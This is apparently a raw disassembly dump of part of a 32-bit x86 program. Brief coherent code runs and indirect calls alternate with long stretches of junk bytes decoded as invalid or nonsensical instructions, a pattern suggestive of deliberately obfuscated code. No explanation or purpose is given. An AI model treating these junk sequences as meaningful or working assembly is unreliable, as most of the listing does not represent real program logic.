  41f39d:	and    al,0x96
  41f39f:	cli    
  41f3a0:	sahf   
  41f3a1:	jo     0x41f3c0
  41f3a3:	popf   
  41f3a4:	ja     0x41f412
  41f3a6:	push   esi
  41f3a7:	jge    0x41f336
  41f3a9:	mov    cl,0x32
  41f3ab:	scas   eax,DWORD PTR es:[edi]
  41f3ac:	mov    eax,DWORD PTR [ebp-0x1c]
  41f3af:	mov    ecx,DWORD PTR [ebp-0x1c]
  41f3b2:	sub    ecx,ebx
  41f3b4:	sub    eax,0x7511
  41f3b9:	xor    ecx,0x78e20000
  41f3bf:	shr    ecx,0x10
  41f3c2:	or     DWORD PTR ds:0x42f544,0x344
  41f3cc:	xor    eax,0x59c9
  41f3d1:	shl    eax,0x10
  41f3d4:	mov    edx,DWORD PTR ds:0x42f65c
  41f3da:	and    DWORD PTR ds:0x42f584,edx
  41f3e0:	or     eax,ecx
  41f3e2:	cmp    DWORD PTR ds:0x42f580,0x0
  41f3e9:	jbe    0x41f4e1
  41f3ef:	movzx  ecx,BYTE PTR ds:0x42f5fc
  41f3f6:	and    DWORD PTR ds:0x42f628,ecx
  41f3fc:	jmp    0x41f4e1
  41f401:	push   DWORD PTR [ebp-0x14]
  41f404:	push   DWORD PTR [ebp-0x28]
  41f407:	push   DWORD PTR [ebp-0x18]
  41f40a:	push   DWORD PTR [ebp-0x10]
  41f40d:	call   DWORD PTR ds:0x4387dc
  41f413:	jmp    0x41f4e1
  41f418:	das    
  41f419:	jnp    0x41f3e1
  41f41b:	inc    ecx
  41f41c:	(bad)  
  41f41d:	std    
  41f41e:	scas   eax,DWORD PTR es:[edi]
  41f41f:	jg     0x41f453
  41f421:	xor    DWORD PTR [eax-0x22],ecx
  41f424:	xchg   ebx,eax
  41f425:	popf   
  41f426:	jecxz  0x41f40c
  41f428:	(bad)  
  41f429:	ins    BYTE PTR es:[edi],dx
  41f42a:	add    DWORD PTR [eax],eax
  41f42c:	mov    cl,0x0
  41f42e:	add    BYTE PTR [eax],al
  41f430:	or     eax,0x3cf7bd69
  41f435:	imul   ebp,ebp,0xfffffff9
  41f438:	or     dh,BYTE PTR [edx+0x2e]
  41f43b:	sub    BYTE PTR [ebx+0x23],al
  41f43e:	call   0x6cb:0x2238c498
  41f445:	(bad)  
  41f446:	aaa    
  41f447:	pop    esi
  41f448:	aam    0x62
  41f44a:	sub    esp,DWORD PTR [edi-0x1254839d]
  41f450:	push   ebx
  41f451:	mov    ebx,0xdcbd952c
  41f456:	jle    0x41f4c7
  41f458:	push   eax
  41f459:	pop    esp
  41f45a:	outs   dx,DWORD PTR ds:[esi]
  41f45b:	jmp    0xd68a:0x64673c86
  41f462:	daa    
  41f463:	adc    al,0x9e
  41f465:	imul   eax,DWORD PTR [ecx+0x610cec29],0xffffffec
  41f46c:	hlt    
  41f46d:	jns    0x41f42f
  41f46f:	loope  0x41f419
  41f471:	in     al,dx
  41f472:	in     al,dx
  41f473:	push   esi
  41f474:	adc    bh,cl
  41f476:	mov    edx,0x3d7a943e
  41f47b:	lock imul edx,DWORD PTR [edi-0x3194da0e],0xfffffffd
  41f483:	imul   esi,edx,0xd7f8bd6
  41f489:	add    bl,bl
  41f48b:	imul   esp,DWORD PTR [ecx-0x2508fd6d],0x88b321b7
  41f495:	inc    edx
  41f496:	int    0x93
  41f498:	js     0x41f45f
  41f49a:	shl    BYTE PTR [ebp-0x4c467562],cl
  41f4a0:	and    ch,bl
  41f4a2:	or     esp,0xfffffff2
  41f4a5:	lock and cl,BYTE PTR [edx-0x73]
  41f4a9:	cmp    DWORD PTR [esi+0x76],0x72
  41f4ad:	jae    0x41f4c6
  41f4af:	ss sysexit 
  41f4b2:	hlt    
  41f4b3:	loop   0x41f44d
  41f4b5:	scas   eax,DWORD PTR es:[edi]
  41f4b6:	ss (bad) 
  41f4b8:	loope  0x41f4ce
  41f4ba:	je     0x41f4a6
  41f4bc:	nop
  41f4bd:	sar    BYTE PTR [bx+si-0x3dcc],cl
  41f4c2:	dec    bh
  41f4c4:	pop    ebp
  41f4c5:	mov    edx,0xf4231697
  41f4ca:	mov    cl,0x8e
  41f4cc:	jnp    0x41f458
  41f4ce:	xchg   edx,eax
  41f4cf:	push   cs
  41f4d0:	dec    esi
  41f4d1:	mov    ah,0x21
  41f4d3:	mov    edx,DWORD PTR [ecx+0x62]
  41f4d6:	je     0x41f4b2
  41f4d8:	mov    ch,0xbb
  41f4da:	jle    0x41f4c1
  41f4dc:	mov    dl,0x28
  41f4de:	mov    al,ds:0xc32b3743
  41f4e3:	jmp    0x41f5b1
  41f4e8:	adc    ecx,eax
  41f4ea:	mov    edx,0xf37bfb4b
  41f4ef:	fsub   DWORD PTR ds:0xd770d2ab
  41f4f5:	push   0x6d78c48a
  41f4fa:	add    DWORD PTR [eax],eax
  41f4fc:	mov    cl,0x0
  41f4fe:	add    BYTE PTR [eax],al
  41f500:	and    al,0x31
  41f502:	mov    ecx,0x26bb3312
  41f507:	sub    BYTE PTR [ebp-0x75843f53],0x2a
  41f50e:	xor    BYTE PTR [ebx-0x4d5ebebd],bh
  41f514:	mov    ah,0x17
  41f516:	jl     0x41f52a
  41f518:	jle    0x41f549
  41f51a:	mov    bh,0xc7
  41f51c:	ja     0x41f500
  41f51e:	pusha  
  41f51f:	pop    esp
  41f520:	scas   eax,DWORD PTR es:[edi]
  41f521:	sbb    DWORD PTR [esi-0x7f9c42f6],eax
  41f527:	loopne 0x41f4ef
  41f529:	call   0xd630b643
  41f52e:	adc    BYTE PTR [edx+0x3c9dfcf1],al
  41f534:	(bad)  
  41f535:	mov    ecx,edx
  41f537:	(bad)  
  41f538:	push   0x21
  41f53a:	les    eax,FWORD PTR [ecx-0x135d7031]
  41f540:	pushf  
  41f541:	xor    esi,DWORD PTR [edi-0x61]
  41f544:	xor    al,0xc4
  41f546:	cwde   
  41f547:	into   
  41f548:	mov    dh,0xa8
  41f54a:	and    eax,0x5f682c15
  41f54f:	int3   
  41f550:	das    
  41f551:	mov    eax,ds:0xd201aa93
  41f556:	call   0x81b5:0xc35112d0
  41f55d:	xchg   edx,eax
  41f55e:	test   DWORD PTR [ecx+eiz*1+0x733650b8],ebp
  41f565:	mov    al,0xb4
  41f567:	pusha  
  41f568:	push   ebp
  41f569:	push   ecx
  41f56a:	outs   dx,DWORD PTR ds:[esi]
  41f56b:	mov    esi,0x6d99e35f
  41f570:	mov    ah,0x41
  41f572:	cmp    dl,BYTE PTR [edx-0x3601234b]
  41f578:	pop    edi
  41f579:	fild   DWORD PTR [edx-0x3343c294]
  41f57f:	fldcw  WORD PTR [ebx-0x2ed2f1df]
  41f585:	lds    ecx,FWORD PTR [esi*1+0x16b1d43a]
  41f58c:	arpl   WORD PTR [edi-0x67],bp
  41f58f:	imul   ecx,DWORD PTR ds:[edx+0x12],0x8d1b4939
  41f597:	sub    ebp,DWORD PTR ds:0xbda97f83
  41f59d:	loope  0x41f5e3
  41f59f:	sbb    al,0xd4
  41f5a1:	add    eax,DWORD PTR [esp+edx*8]
  41f5a4:	pop    es
  41f5a5:	shl    DWORD PTR [ebx+0x76736fb],cl
  41f5ab:	mov    ch,0x91
  41f5ad:	dec    esp
  41f5ae:	ss sbb eax,0xcc45895a
  41f5b4:	mov    eax,ds:0x42f1b4
  41f5b9:	mov    DWORD PTR [ebp-0x34],eax
  41f5bc:	jmp    0x41f68a
  41f5c1:	icebp  
  41f5c2:	rcr    BYTE PTR [ecx-0x31],0x79
  41f5c6:	fcomip st,st(7)
  41f5c8:	(bad)  
  41f5c9:	fisttp WORD PTR [ebx+0x52ba9fdd]
  41f5cf:	cdq    
  41f5d0:	int    0x29
  41f5d2:	outs   dx,BYTE PTR ds:[esi]
  41f5d3:	add    DWORD PTR [eax],eax
  41f5d5:	mov    cl,0x0
  41f5d7:	add    BYTE PTR [eax],al
  41f5d9:	gs xchg esp,eax
  41f5db:	pop    ecx
  41f5dc:	xchg   ecx,eax
  41f5dd:	fidivr WORD PTR [eax]
  41f5df:	es lahf 
  41f5e1:	jge    0x41f56f
  41f5e3:	cwde   
  41f5e4:	jge    0x41f586
  41f5e6:	mov    eax,ds:0x99bcb1fb
  41f5eb:	adc    bl,BYTE PTR [edx-0x201bd9b6]
  41f5f1:	xor    al,0xcf
  41f5f3:	push   edx
  41f5f4:	or     cl,BYTE PTR [ebx+0x124106eb]
  41f5fa:	into   
  41f5fb:	mov    WORD PTR [ebp+ebp*8-0x5a871bac],gs
  41f602:	mov    DWORD PTR [eax],eax
  41f604:	out    0x8b,al
  41f606:	js     0x41f5ff
  41f608:	mov    cl,0x8f
  41f60a:	aam    0x8d
  41f60c:	xor    ebp,DWORD PTR [ebx+0x31]
  41f60f:	dec    esi
  41f610:	mov    WORD PTR [ecx-0x3b9b2325],fs
  41f616:	sti    
  41f617:	lods   eax,DWORD PTR ds:[esi]
  41f618:	jl     0x41f63d
  41f61a:	sbb    ebx,DWORD PTR [esi-0x37e3cbfe]
  41f620:	xor    eax,0x20ec9516
  41f625:	fstp   TBYTE PTR [ebx-0x2c98cca]
  41f62b:	stc    
  41f62c:	dec    esp
  41f62d:	int    0xe
  41f62f:	clc    
  41f630:	loopne 0x41f673
  41f632:	jae    0x41f5fc
  41f634:	mov    ds:0x444ae966,eax
  41f639:	into   
  41f63a:	adc    esp,DWORD PTR [esi]
  41f63c:	scas   al,BYTE PTR es:[edi]
  41f63d:	imul   eax,DWORD PTR [esi+eiz*8+0x54ded5c9],0xc457624d
  41f648:	xchg   ecx,eax
  41f649:	dec    edx
  41f64a:	sub    BYTE PTR fs:[edx+0x5c094568],bh
  41f651:	mov    cl,0x53
  41f653:	ins    DWORD PTR es:[edi],dx
  41f654:	fimul  DWORD PTR [edi]
  41f656:	(bad)  
  41f657:	aaa    
  41f658:	(bad)  
  41f659:	cld    
  41f65a:	bound  eax,QWORD PTR [edx-0x162aabcc]
  41f660:	xor    al,0x1b
  41f662:	push   ss
  41f663:	push   ebp
  41f664:	enter  0xba6a,0x4b
  41f668:	push   ebp
  41f669:	bound  edx,QWORD PTR [esi+0x4affb152]
  41f66f:	gs in  al,0x81
  41f672:	ffree  st(6)
  41f674:	pop    ebx
  41f675:	xchg   ebp,eax
  41f676:	dec    eax
  41f677:	mov    esi,0xcf089049
  41f67c:	cmp    eax,0xc3d94e5f
  41f681:	ds addr16 push esi
  41f684:	fwait
  41f685:	outs   dx,BYTE PTR ds:[esi]
  41f686:	adc    DWORD PTR [ecx+0x458b9b41],eax
  41f68c:	ror    BYTE PTR [ecx+0x458be445],0xe4
  41f693:	jmp    0x41f761
  41f698:	les    ecx,FWORD PTR [ebx+0x7]
  41f69b:	cwde   
  41f69c:	(bad)  
  41f69d:	(bad)  
  41f69f:	pop    edi
  41f6a0:	gs adc edx,edi
  41f6a3:	lahf   
  41f6a4:	cwde   
  41f6a5:	or     DWORD PTR [edi-0x1c],eax
  41f6a8:	fisubr DWORD PTR [esi+0x1]
  41f6ab:	add    BYTE PTR [ecx-0x22000000],dh
  41f6b1:	cdq    
  41f6b2:	rol    BYTE PTR ds:0xffa121e6,0xd1
  41f6b9:	enter  0x772c,0x93
  41f6bd:	pop    ebx
  41f6be:	loopne 0x41f66e
  41f6c0:	outs   dx,BYTE PTR ds:[esi]
  41f6c1:	loopne 0x41f73c
  41f6c3:	icebp  
  41f6c4:	cmp    al,0x93
  41f6c6:	mov    dl,0xb9
  41f6c8:	dec    ebp
  41f6c9:	sub    cl,BYTE PTR [ecx]
  41f6cb:	fiadd  WORD PTR [edx-0x7fcc4ee5]
  41f6d1:	hlt    
  41f6d2:	sub    eax,DWORD PTR [ebx-0x44f6e51b]
  41f6d8:	xchg   ecx,eax
  41f6d9:	sbb    BYTE PTR ds:0x815889fb,bh
  41f6e0:	stos   DWORD PTR es:[edi],eax
  41f6e1:	imul   DWORD PTR [esp+ecx*2]
  41f6e4:	and    eax,0x9832bf35
  41f6e9:	or     DWORD PTR [esi],ebp
  41f6eb:	sbb    BYTE PTR [ebp-0x76],cl
  41f6ee:	pusha  
  41f6ef:	or     ah,BYTE PTR [eax+0x7b9302a]
  41f6f5:	adc    dh,BYTE PTR ds:0x65f279fb
  41f6fb:	cdq    
  41f6fc:	loopne 0x41f6ad
  41f6fe:	push   ebx
  41f6ff:	loopne 0x41f737
  41f701:	in     eax,dx
  41f702:	(bad)
  41f705:	mov    ds:0x70550433,al
  41f70a:	in     al,0xc9
  41f70c:	lods   eax,DWORD PTR ds:[esi]
  41f70d:	dec    ecx
  41f70e:	loope  0x41f6c3
  41f710:	mov    cl,0x7d
  41f712:	(bad)  
  41f713:	dec    BYTE PTR [edx]
  41f715:	jge    0x41f72c
  41f717:	dec    edx
  41f718:	iret   
  41f719:	inc    ecx
  41f71a:	pop    es
  41f71b:	sahf   
  41f71c:	pop    edx
  41f71d:	pop    edx
  41f71e:	xchg   edx,eax
  41f71f:	jmp    0x9009:0x603ff973
  41f726:	les    esp,FWORD PTR [ecx-0x2ec6b4]
  41f72c:	mov    sp,0x56f3
  41f730:	bound  ebp,QWORD PTR [esi]
  41f732:	push   ss
  41f733:	pop    es
  41f734:	call   0xbcb8:0xd5a89008
  41f73b:	sbb    BYTE PTR [ebx+0x40289136],0x20
  41f742:	(bad)  
  41f743:	cmp    cl,BYTE PTR [edi+eiz*1]
  41f746:	or     al,0xe2
  41f748:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f749:	mov    edx,0x56eb4ee9
  41f74e:	fdivr  QWORD PTR [ebp-0x4b5a88ed]
  41f754:	and    DWORD PTR [ebx-0x33063e1d],edi
  41f75a:	std    
  41f75b:	inc    edx
  41f75c:	xor    al,0x1e
  41f75e:	div    ecx
  41f760:	xchg   esp,eax
  41f761:	push   0x4
  41f763:	pop    ecx
  41f764:	movzx  edx,WORD PTR ds:0x42f58c
  41f76b:	sub    DWORD PTR ds:0x42f60c,edx
  41f771:	sub    ecx,eax
  41f773:	add    ecx,DWORD PTR [ebp-0x3c]
  41f776:	cmp    DWORD PTR ds:0x42f61c,0x0
  41f77d:	ja     0x41f7ab
  41f783:	movzx  edx,WORD PTR ds:0x42f5ec
  41f78a:	or     DWORD PTR ds:0x42f630,edx
  41f790:	adc    eax,DWORD PTR ds:0x42f550
  41f796:	jmp    0x41f7ab
  41f79b:	push   0x30ec
  41f7a0:	push   0x1f23
  41f7a5:	call   DWORD PTR ds:0x4387a0
  41f7ab:	mov    DWORD PTR [ebp-0x10],ecx
  41f7ae:	mov    DWORD PTR [ebp-0x90],0x4aefda42
  41f7b8:	jmp    0x41f886
  41f7bd:	add    DWORD PTR [esi+0x13],eax
  41f7c0:	dec    ebp
  41f7c1:	push   edi
  41f7c2:	pop    ebp
  41f7c3:	pop    edi
  41f7c4:	dec    esi
  41f7c5:	mov    eax,ds:0x5dde7906
  41f7ca:	jb     0x41f7a2
  41f7cc:	lahf   
  41f7cd:	mov    ebp,DWORD PTR [edi+0x1]
  41f7d0:	add    BYTE PTR [ecx+0x8000000],dh
  41f7d6:	les    esp,FWORD PTR [ebp-0x680559eb]
  41f7dc:	adc    DWORD PTR [ebx+0x53],eax
  41f7df:	inc    eax
  41f7e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7e1:	mov    DWORD PTR [eax-0x6c5532dc],edi
  41f7e7:	adc    DWORD PTR [ecx],eax
  41f7e9:	cs pop ecx
  41f7eb:	push   esi
  41f7ec:	test   DWORD PTR [ebx+0x65],edx
  41f7ef:	jge    0x41f7ce
  41f7f1:	cmp    edx,DWORD PTR [eax+0x59]
  41f7f4:	mov    al,0xeb
  41f7f6:	out    0x8d,al
  41f7f8:	cmp    DWORD PTR [edx+edi*2],eax
  41f7fb:	lods   eax,DWORD PTR ds:[esi]
  41f7fc:	mov    esp,DWORD PTR ds:0x34ff61fb
  41f802:	xchg   edx,eax
  41f803:	loopne 0x41f884
  41f805:	test   DWORD PTR ds:0x89978f38,ecx
  41f80b:	cmp    BYTE PTR [edx],bl
  41f80d:	add    ebx,DWORD PTR [esi]
  41f80f:	lods   al,BYTE PTR ds:[esi]
  41f810:	and    dl,BYTE PTR [edi]
  41f812:	into   
  41f813:	push   ds
  41f814:	nop
  41f815:	stos   BYTE PTR es:[edi],al
  41f816:	push   0xffffffe5
  41f818:	cmovae eax,DWORD PTR [ebx+esi*2+0x53aa122f]
  41f820:	dec    ebp
  41f821:	xchg   ecx,eax
  41f822:	pop    esi
  41f823:	sub    DWORD PTR [edx-0x65],esi
  41f826:	push   ebp
  41f827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f828:	push   ss
  41f829:	pushf  
  41f82a:	inc    edi
  41f82b:	jno    0x41f7f9
  41f82d:	or     edx,DWORD PTR [esp+esi*8]
  41f830:	aaa    
  41f831:	push   esp
  41f832:	jmp    0xfa48c941
  41f837:	retf   0x816b
  41f83a:	jnp    0x41f80c
  41f83c:	loop   0x41f8b8
  41f83e:	pop    ss
  41f83f:	pushf  
  41f840:	mov    al,0x6d
  41f842:	dec    edx
  41f843:	lods   eax,DWORD PTR ds:[esi]
  41f844:	ret    
  41f845:	sbb    BYTE PTR [esi+0x64],dh
  41f848:	mov    dl,cl
  41f84a:	(bad)  [edx-0x25]
  41f84d:	out    dx,eax
  41f84e:	push   0x8fdc10eb
  41f853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f854:	sbb    eax,0x63bc9ac2
  41f859:	addr16 hlt 
  41f85b:	fwait
  41f85c:	in     eax,dx
  41f85d:	shl    ah,0x29
  41f860:	xor    ch,bl
  41f862:	clc    
  41f863:	mov    edi,0xfc4237e5
  41f868:	ins    DWORD PTR es:[edi],dx
  41f869:	(bad)  
  41f86a:	xor    esi,DWORD PTR [esi-0x21]
  41f86d:	rcl    DWORD PTR [eax],1
  41f86f:	sahf   
  41f870:	aam    0x2d
  41f872:	dec    ebx
  41f873:	lods   eax,DWORD PTR ds:[esi]
  41f874:	outs   dx,BYTE PTR ds:[esi]
  41f875:	adc    al,0x7d
  41f877:	push   0x48
  41f879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f87a:	cmp    cl,bh
  41f87c:	in     al,0x92
  41f87e:	enter  0x5abe,0x72
  41f882:	enter  0x65ce,0x60
  41f886:	mov    eax,DWORD PTR [ebp-0x1c]
  41f889:	mov    ecx,DWORD PTR [ebp+0x8]
  41f88c:	and    DWORD PTR ds:0x42f570,edi
  41f892:	mov    edx,DWORD PTR [ebp+0xc]
  41f895:	jmp    0x41f963
  41f89a:	mov    WORD PTR ds:0xfeffbc5f,fs
  41f8a0:	out    dx,eax
  41f8a1:	xor    eax,0xdfa3a31
  41f8a6:	add    edx,esp
  41f8a8:	jmp    0xb100:0x1703c33
  41f8af:	add    BYTE PTR [eax],al
  41f8b1:	add    BYTE PTR [ecx],ch
  41f8b3:	and    esi,DWORD PTR [ebx+eiz*2+0x19]
  41f8b7:	dec    ebp
  41f8b8:	or     ah,BYTE PTR [ebp+0x77314557]
  41f8be:	pop    ecx
  41f8bf:	mov    ah,0x57
  41f8c1:	add    al,dl
  41f8c3:	imul   ebp,DWORD PTR [esi+0x2c6480e],0xa1aa1b1f
  41f8cd:	scas   eax,DWORD PTR es:[edi]
  41f8ce:	mov    ah,0xe6
  41f8d0:	mov    eax,0x24e979a2
  41f8d5:	mov    ds:0x7401354d,eax
  41f8da:	rcl    BYTE PTR [ebx],1
  41f8dc:	cld    
  41f8dd:	fnstenv [eax+0x6b92a0c]
  41f8e3:	and    edi,esi
  41f8e5:	nop
  41f8e6:	pop    edi
  41f8e7:	push   eax
  41f8e8:	lock push eax
  41f8ea:	call   0x6dadb2de
  41f8ef:	fnstcw WORD PTR [edi]
  41f8f1:	inc    ebx
  41f8f2:	mov    ds:0xf1f1cb82,eax
  41f8f7:	fisubr DWORD PTR [edx+0xef5ab2c]
  41f8fd:	cmp    DWORD PTR [ecx],edx
  41f8ff:	push   eax
  41f900:	ror    BYTE PTR [edi],1
  41f902:	popf   
  41f903:	in     al,dx
  41f904:	in     eax,0xe7
  41f906:	xor    BYTE PTR [ebp-0x5e8dd4fe],al
  41f90c:	retf   
  41f90d:	inc    esp
  41f90e:	ror    DWORD PTR [edx],0xd9
  41f911:	mov    WORD PTR [ecx+ebx*4],es
  41f914:	div    DWORD PTR [edi-0x472cea9b]
  41f91a:	jno    0x41f964
  41f91c:	addr16 sub eax,0xdf77b8a0
  41f922:	inc    edx
  41f923:	mov    bh,BYTE PTR [ecx-0x21]
  41f926:	lahf   
  41f927:	mov    edx,0xe2ba95dc
  41f92c:	sbb    ebp,DWORD PTR [ebx-0x779bdeb1]
  41f932:	jg     0x41f8fd
  41f934:	or     dh,BYTE PTR [esi-0x37]
  41f937:	and    eax,0x2662bec2
  41f93c:	push   edi
  41f93d:	shl    dl,0x46
  41f940:	lods   al,BYTE PTR ds:[esi]
  41f941:	xor    dl,BYTE PTR [edx+0x735a81b6]
  41f947:	cmp    bh,al
  41f949:	fdiv   DWORD PTR [eax+eiz*2]
  41f94c:	mov    BYTE PTR [esi-0x40],0x83
  41f950:	jmp    0xad3c7ae5
  41f955:	or     BYTE PTR [esi-0x44],ah
  41f958:	gs mov bl,0xf1
  41f95b:	in     al,0x1
  41f95d:	hlt    
  41f95e:	(bad)  
  41f95f:	add    DWORD PTR [edx-0x31cc27fe],eax
  41f965:	xor    DWORD PTR ds:0x42f65c,ebx
  41f96b:	jmp    0x41fa39
  41f970:	(bad)  
  41f972:	sub    eax,0xdfe73de0
  41f977:	(bad)  
  41f978:	jnp    0x41f9f2
  41f97a:	pushf  
  41f97b:	cmp    BYTE PTR [edi-0x54],dh
  41f97e:	jl     0x41f947
  41f980:	in     eax,dx
  41f981:	jo     0x41f984
  41f983:	add    BYTE PTR [ecx+0x45000000],dh
  41f989:	pop    esp
  41f98a:	in     al,0xcc
  41f98c:	test   al,0xbb
  41f98e:	jge    0x41f9eb
  41f990:	inc    eax
  41f991:	icebp  
  41f992:	push   edx
  41f993:	mov    esp,0x4e3c410e
  41f998:	fdiv   DWORD PTR [ebx+0x2add05ce]
  41f99e:	mov    esi,eax
  41f9a0:	pop    ds
  41f9a1:	pop    esp
  41f9a2:	xchg   esi,eax
  41f9a3:	cmp    eax,0x856f157c
  41f9a8:	or     al,0xfc
  41f9aa:	mov    dl,al
  41f9ac:	push   ecx
  41f9ad:	dec    edx
  41f9ae:	push   cs
  41f9af:	(bad)  
  41f9b0:	aaa    
  41f9b1:	push   eax
  41f9b2:	jp     0x41f943
  41f9b4:	push   ds
  41f9b5:	(bad)  
  41f9b6:	shr    BYTE PTR ds:0x178316f7,1
  41f9bc:	(bad)  
  41f9bd:	out    dx,al
  41f9be:	int3   
  41f9bf:	test   BYTE PTR ds:[esi-0x5dca2eaa],dl
  41f9c6:	inc    eax
  41f9c7:	arpl   WORD PTR [edi+0x63b41ed6],bx
  41f9cd:	imul   ebx,DWORD PTR [edx+0x1e6cd41f],0x37469487
  41f9d7:	ins    DWORD PTR es:[edi],dx
  41f9d8:	add    al,0xd1
  41f9da:	xlat   BYTE PTR ds:[ebx]
  41f9db:	push   ds
  41f9dc:	cdq    
  41f9dd:	cli    
  41f9de:	out    dx,eax
  41f9df:	inc    edi
  41f9e0:	xchg   edx,eax
  41f9e1:	dec    esp
  41f9e2:	leave  
  41f9e3:	jg     0x41fa08
  41f9e5:	xor    al,0x41
  41f9e7:	inc    ecx
  41f9e8:	push   es
  41f9e9:	sub    cl,al
  41f9eb:	int3   
  41f9ec:	pop    ss
  41f9ed:	or     eax,0x79751e48
  41f9f2:	mov    ch,0x9b
  41f9f4:	mov    ebx,0xc516692f
  41f9f9:	sub    dl,0x48
  41f9fc:	(bad)  
  41f9fd:	lock mov cl,BYTE PTR [edx]
  41fa00:	xchg   ecx,eax
  41fa01:	in     eax,dx
  41fa02:	push   ecx
  41fa03:	fwait
  41fa04:	push   edi
  41fa05:	jp     0x41fa52
  41fa07:	test   al,0xc9
  41fa09:	push   0x64
  41fa0b:	aad    0xdd
  41fa0d:	inc    esi
  41fa0e:	retf   0xaf0a
  41fa11:	mov    esi,0x1fe2ccaf
  41fa16:	stc    
  41fa17:	test   edx,ebp
  41fa19:	cmc    
  41fa1a:	jl     0x41fa91
  41fa1c:	mov    al,ds:0xc544e72a
  41fa21:	leave  
  41fa22:	dec    edi
  41fa23:	sub    ebx,DWORD PTR [eax]
  41fa25:	jg     0x41fa3c
  41fa27:	stos   BYTE PTR es:[edi],al
  41fa28:	mov    edi,0x6078cbb7
  41fa2d:	add    al,0x36
  41fa2f:	stos   BYTE PTR es:[edi],al
  41fa30:	scas   eax,DWORD PTR es:[edi]
  41fa31:	push   ecx
  41fa32:	push   es
  41fa33:	mov    ebp,0x2aa712bb
  41fa38:	pusha  
  41fa39:	mov    DWORD PTR [ebp+ecx*4+0x66e188a8],eax
  41fa40:	jmp    0x41fb0e
  41fa45:	dec    ebx
  41fa46:	stos   DWORD PTR es:[edi],eax
  41fa47:	nop
  41fa48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa49:	lock mov edi,0xd74eef7f
  41fa4f:	mov    ecx,0x19c0079f
  41fa54:	pop    ecx
  41fa55:	sahf   
  41fa56:	jno    0x41fa59
  41fa58:	add    BYTE PTR [ecx+0x33000000],dh
  41fa5e:	or     BYTE PTR [ebx-0x2108f980],0x9c
  41fa65:	repz clc 
  41fa67:	jno    0x41fa80
  41fa69:	pushf  
  41fa6a:	outs   dx,DWORD PTR ds:[esi]
  41fa6b:	retf   
  41fa6c:	inc    edi
  41fa6d:	jle    0x41fab3
  41fa6f:	lods   al,BYTE PTR ds:[esi]
  41fa70:	xchg   edx,eax
  41fa71:	mov    al,ds:0x4b796145
  41fa76:	in     eax,0xfb
  41fa78:	scas   eax,DWORD PTR es:[edi]
  41fa79:	lea    edx,[ecx-0x55]
  41fa7c:	jmp    0x5264cb75
  41fa81:	inc    ebx
  41fa82:	mov    DWORD PTR [esi-0x4d],ebp
  41fa85:	add    esi,DWORD PTR [ebp+eiz*2+0x1ed06f0d]
  41fa8c:	xchg   edx,eax
  41fa8d:	jnp    0x41fad6
  41fa8f:	bound  eax,QWORD PTR [eax+esi*2-0x3ee0cc81]
  41fa96:	inc    ebp
  41fa97:	out    0xe5,al
  41fa99:	(bad)  
  41fa9a:	loopne 0x41fa47
  41fa9c:	(bad)  
  41fa9d:	shl    BYTE PTR [ecx+0xc],cl
  41faa0:	cmp    ebx,DWORD PTR [ecx+0x18]
  41faa3:	adc    BYTE PTR [eax],ch
  41faa5:	cdq    
  41faa6:	mov    bh,0x4a
  41faa8:	cli    
  41faa9:	hlt    
  41faaa:	mov    ch,0x54
  41faac:	push   edi
  41faad:	(bad)  
  41faae:	in     al,0x2b
  41fab0:	mov    esp,0xc2a7919b
  41fab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fab6:	in     al,dx
  41fab7:	mov    ds:0x9e57b0e7,al
  41fabc:	jns    0x41fb1e
  41fabe:	push   ecx
  41fabf:	call   0xd55:0x48c2a65d
  41fac6:	shl    DWORD PTR [ebp+0x2d],1
  41fac9:	cld    
  41faca:	mov    WORD PTR [eax+0x15],es
  41facd:	xchg   edx,ecx
  41facf:	fnsave [ecx]
  41fad1:	or     al,BYTE PTR [edi-0x66aaaf91]
  41fad7:	mov    eax,0x519b94e8
  41fadc:	and    ebx,DWORD PTR [ebx-0x7d]
  41fadf:	test   ecx,0x63addc50
  41fae5:	sbb    edi,DWORD PTR [ebp-0x2b]
  41fae8:	push   es
  41fae9:	or     al,0xb5
  41faeb:	cmp    ah,BYTE PTR [ecx]
  41faed:	mov    al,0x68
  41faef:	pop    ebx
  41faf0:	push   ebx
  41faf1:	or     DWORD PTR [edx+0x50],esp
  41faf4:	push   edi
  41faf5:	icebp  
  41faf6:	push   esi
  41faf7:	adc    DWORD PTR ds:0x9fb79e09,ecx
  41fafd:	test   al,0xc2
  41faff:	mov    DWORD PTR [ebx+0x315a9255],ebp
  41fb05:	scas   al,BYTE PTR es:[edi]
  41fb06:	fcom   QWORD PTR [ecx-0x30e486f3]
  41fb0c:	cmp    dl,cl
  41fb0e:	mov    eax,DWORD PTR [ebp-0x10]
  41fb11:	mov    ecx,DWORD PTR [ebp+0x10]
  41fb14:	add    DWORD PTR ds:0x42f610,ecx
  41fb1a:	mov    edx,DWORD PTR [ebp+0x14]
  41fb1d:	xor    ecx,esi
  41fb1f:	and    DWORD PTR ds:0x42f624,0x561f
  41fb29:	mov    DWORD PTR [ebp+ecx*4+0x66e188a8],eax
  41fb30:	xor    eax,ecx
  41fb32:	jmp    0x41fc00
  41fb37:	pop    ss
  41fb38:	sbb    eax,0xfb6f896f
  41fb3d:	neg    DWORD PTR [edi-0x1bd8939d]
  41fb43:	pop    cx
  41fb45:	aad    0x74
  41fb47:	dec    edi
  41fb48:	jb     0x41fb4b
  41fb4a:	add    BYTE PTR [ecx-0x6c000000],dh
  41fb50:	ds pusha 
  41fb52:	rcr    DWORD PTR [edi+0x6afd25a3],1
  41fb58:	sub    DWORD PTR [edi+ebx*8],esi
  41fb5b:	adc    bh,0xfc
  41fb5e:	dec    esp
  41fb5f:	lods   eax,DWORD PTR ds:[esi]
  41fb60:	in     al,dx
  41fb61:	fcomip st,st(3)
  41fb63:	mov    edi,0x4b13d0f4
  41fb68:	pop    edi
  41fb69:	mov    ch,0x64
  41fb6b:	lods   al,BYTE PTR ds:[esi]
  41fb6c:	sub    al,0xa1
  41fb6e:	call   0x3c8d:0x5d3f5f0c
  41fb75:	(bad)  
  41fb76:	aam    0x6b
  41fb78:	lods   al,BYTE PTR ds:[esi]
  41fb79:	jmp    0x2f9ef300
  41fb7e:	sub    BYTE PTR [esi-0x183d9484],0x21
